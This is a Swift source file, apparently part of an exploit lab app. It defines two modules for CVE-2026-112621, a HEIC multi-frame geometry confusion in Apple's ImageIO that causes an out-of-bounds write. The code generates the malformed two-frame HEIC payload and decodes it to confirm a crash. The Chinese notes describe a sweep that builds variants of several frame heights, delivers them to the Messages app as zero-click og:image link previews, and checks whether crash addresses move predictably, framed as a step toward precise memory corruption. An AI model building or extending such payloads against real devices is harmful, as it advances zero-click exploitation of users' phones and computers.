import Foundation
import ImageIO
import CoreGraphics

// MARK: - CVE-2026-112621 · two-frame HEIC, geometry pinned by frame 0
//
// The public PoC (Xplo8E/CVE-2026-112621-oob-write-poc) ships a generator and an og:image
// delivery page, and nothing else — no crash, no stack, no heap shape. This module is the
// part that is missing: build the same two-frame collection and decode both frames inside our
// own process, where the journal, the artifact and the `.ips` are all ours.
//
// The shape is a geometry confusion between frames of one collection. From the PoC:
//
//     const size_t heights[] = {16, 48};
//     // The order matters: frame 0 establishes the size used for later frames.
//
// A decoder that sizes its surface from frame 0 (16 rows) and then decodes frame 1 (48 rows)
// into that surface writes 32 rows past the end. Delivering it needs no interaction at all:
// an `og:image` pointing at the file makes any link preview fetch and decode it.

enum HEICPayload {

    /// Writes a two-frame HEIC collection and returns its bytes.
    static func writeTwoFrames(to url: URL,
                               width: Int = 256,
                               firstHeight: Int = 16,
                               secondHeight: Int = 48) -> Data? {
        try? FileManager.default.removeItem(at: url)
        guard let destination = CGImageDestinationCreateWithURL(url as CFURL,
                                                              "public.heic" as CFString, 2, nil) else {
            return nil
        }
        let options = [kCGImageDestinationLossyCompressionQuality: 1.0] as CFDictionary
        let heights = [firstHeight, secondHeight]
        let colors: [UInt32] = [0xFF20_2020, 0xFFAD_BEEF]

        // CGBitmapContext does not own the pixel buffer, and makeImage() is only guaranteed to
        // be safe while the context lives, so every buffer is kept until finalize.
        var buffers: [UnsafeMutableRawPointer] = []
        defer { for buffer in buffers { buffer.deallocate() } }

        for index in 0..<heights.count {
            let height = heights[index]
            let rowBytes = width * 4
            let buffer = UnsafeMutableRawPointer.allocate(byteCount: rowBytes * height, alignment: 16)
            buffers.append(buffer)
            let pixels = buffer.assumingMemoryBound(to: UInt32.self)
            for i in 0..<(width * height) { pixels[i] = colors[index] }

            let info = CGImageAlphaInfo.noneSkipFirst.rawValue | CGBitmapInfo.byteOrder32Little.rawValue
            guard let context = CGContext(data: buffer, width: width, height: height,
                                          bitsPerComponent: 8, bytesPerRow: rowBytes,
                                          space: CGColorSpaceCreateDeviceRGB(),
                                          bitmapInfo: info) else { continue }
            guard let image = context.makeImage() else { continue }
            CGImageDestinationAddImage(destination, image, options)
        }

        guard CGImageDestinationFinalize(destination) else { return nil }
        return try? Data(contentsOf: url)
    }
}

extension Catalog {

    static let heicProbes: [ExploitModule] = [

        ExploitModule(
            id: "iio.heic.frames",
            titleZh: "HEIC 多帧尺寸混淆（帧0 定几何 → 帧1 越界写）",
            cve: "CVE-2026-112621",
            component: "ImageIO · HEIC collection",
            primitive: .oobWrite,
            reach: .inProcess,
            tier: 1,
            summaryZh: "一个两帧 HEIC 集合：帧 0 为 256×16，帧 1 为 256×48。解码侧以帧 0 的几何建立表面，随后把帧 1 解进同一表面，多出的 32 行落在表面之外。公开 PoC 的注释把这层关系写明了：顺序决定后续帧使用的尺寸。修复在 iOS/macOS 27.2，与本工程其余原语同一窗口。",
            notesZh: "顺序是关键：帧 0 必须先入，几何才会被锚定在 16 行。公开仓库只提供生成器与 og:image 投递页（链接预览会自动抓取并解码，属于 0-click），既没有崩溃栈也没有堆形状 —— 本模块的价值就是在自有进程里把它钉成带栈的真机验证。判定：进程在解码帧 1 时消失即命中；否则比对两帧的声明尺寸与实际解码尺寸，若解码尺寸被钳制到 16 行，说明该构建已有尺寸校验。",
            run: { ctx in
                let url = ctx.workdir.appendingPathComponent("heic_two_frames.heic")
                guard let data = HEICPayload.writeTwoFrames(to: url), data.count > 0 else {
                    throw LabError(message: tl("HEIC 生成失败（ImageIO 拒绝写入该集合）"))
                }
                let artifact = ctx.write("heic_two_frames.heic", data)

                ctx.arm("iio.heic.frames", "decode frame 1")
                var lines: [String] = []

                guard let source = CGImageSourceCreateWithData(data as CFData, nil) else {
                    ctx.fail("iio.heic.frames", tl("源创建失败"))
                    throw LabError(message: tl("CGImageSource 拒绝该数据"))
                }
                let count = CGImageSourceGetCount(source)
                let header = tl("帧数: ") + "\(count)" + tl(" · 文件 ") + "\(data.count)" + tl(" B")
                lines.append(header)

                for index in 0..<count {
                    var declared = "?"
                    if let dict = CGImageSourceCopyPropertiesAtIndex(source, index, nil) as? [String: Any] {
                        let w = dict[kCGImagePropertyPixelWidth as String] as? Int ?? 0
                        let h = dict[kCGImagePropertyPixelHeight as String] as? Int ?? 0
                        if w > 0 || h > 0 { declared = "\(w)×\(h)" }
                    }
                    if let image = CGImageSourceCreateImageAtIndex(source, index, nil) {
                        let decoded = "\(image.width)×\(image.height)"
                        lines.append("frame \(index): " + tl("声明 ") + declared + tl(" → 解码 ") + decoded)
                    } else {
                        lines.append("frame \(index): " + tl("声明 ") + declared + tl(" → 拒绝解码"))
                    }
                }
                // Preview services do not decode the full frame — they thumbnail it onto a
                // surface sized by their own max-pixel budget. If the geometry confusion lives
                // in that path, only this pass reaches it. Full-frame decode on its own is an
                // incomplete probe: it returned both frames at their declared sizes on 27.0.1
                // without faulting.
                let thumbOptions: [CFString: Any] = [
                    kCGImageSourceCreateThumbnailFromImageAlways: true,
                    kCGImageSourceThumbnailMaxPixelSize: 1024,
                    kCGImageSourceShouldCacheImmediately: true,
                ]
                for index in 0..<count {
                    if let thumb = CGImageSourceCreateThumbnailAtIndex(source, index, thumbOptions as CFDictionary) {
                        lines.append("thumb \(index): \(thumb.width)×\(thumb.height)")
                    } else {
                        lines.append("thumb \(index): " + tl("拒绝"))
                    }
                }

                ctx.disarm("iio.heic.frames", "frames=\(count)")

                let headline = count == 2 ? tl("两帧均完成解码") : tl("帧数异常")
                let detail = lines.joined(separator: "\n")
                let evidence = [
                    tl("帧0 = 256×16，帧1 = 256×48（顺序决定几何）"),
                    tl("修复窗口 27.2"),
                    tl("公开 PoC 只有生成器与 og:image 投递页，无崩溃栈"),
                ]
                let artifacts = [artifact]
                return ModuleOutcome(headline: headline, detail: detail,
                                     evidence: evidence, artifacts: artifacts)
            }),

        ExploitModule(
            id: "iio.heic.sweep",
            titleZh: "HEIC 帧高扫描（为投递侧准备变体）",
            cve: "CVE-2026-112621",
            component: "ImageIO → LinkPresentation（投递侧）",
            primitive: .probe,
            reach: .systemProcess,
            tier: 3,
            summaryZh: "本模块刻意不触发崩溃。它在设备上生成帧高不同的两帧 HEIC：帧 0 固定 256×16，帧 1 分别为 48/64/96/128，用于投递侧的越界长度扫描 —— 每个变体作为 og:image 发给信息 App，比较崩溃地址是否随帧高可预测地移动。可预测即为「越界长度可控」，那是从「撞墙」走向「精确踩中对象」的第一步。",
            notesZh: "为什么必须在设备上生成：越界长度由帧 1 的实际解码尺寸决定，不是容器里声明的 ispe。只改声明不改码流，解码尺寸不变，不会复现。设备编码器无法在离线环境替代，所以变体只能由 App 生成、经备份取出。产物写在 work/ 下，文件名 heic_h<高度>.heic。",
            run: { ctx in
                ctx.arm("iio.heic.sweep", "generate variants")
                var lines: [String] = []
                var artifacts: [URL] = []
                let heights = [48, 64, 96, 128]
                for height in heights {
                    let name = "heic_h" + "\(height)" + ".heic"
                    let target = ctx.workdir.appendingPathComponent(name)
                    guard let data = HEICPayload.writeTwoFrames(to: target, width: 256,
                                                               firstHeight: 16,
                                                               secondHeight: height),
                          data.count > 0 else {
                        lines.append(name + tl("：生成失败"))
                        continue
                    }
                    artifacts.append(ctx.write(name, data))
                    lines.append(name + "  \(data.count) B" + tl(" · 帧1 高 ") + "\(height)")
                }
                ctx.disarm("iio.heic.sweep", "variants=\(artifacts.count)")

                let headline = tl("已生成 ") + "\(artifacts.count)" + tl(" 个变体")
                let detail = lines.joined(separator: "\n")
                let evidence = [
                    tl("帧0 固定 256×16，帧1 分别 48/64/96/128"),
                    tl("必须在设备上生成：越界长度取决于实际解码尺寸"),
                    tl("产物随备份取出，再挂到 og:image 做投递扫描"),
                ]
                return ModuleOutcome(headline: headline, detail: detail,
                                     evidence: evidence, artifacts: artifacts)
            }),
    ]
}
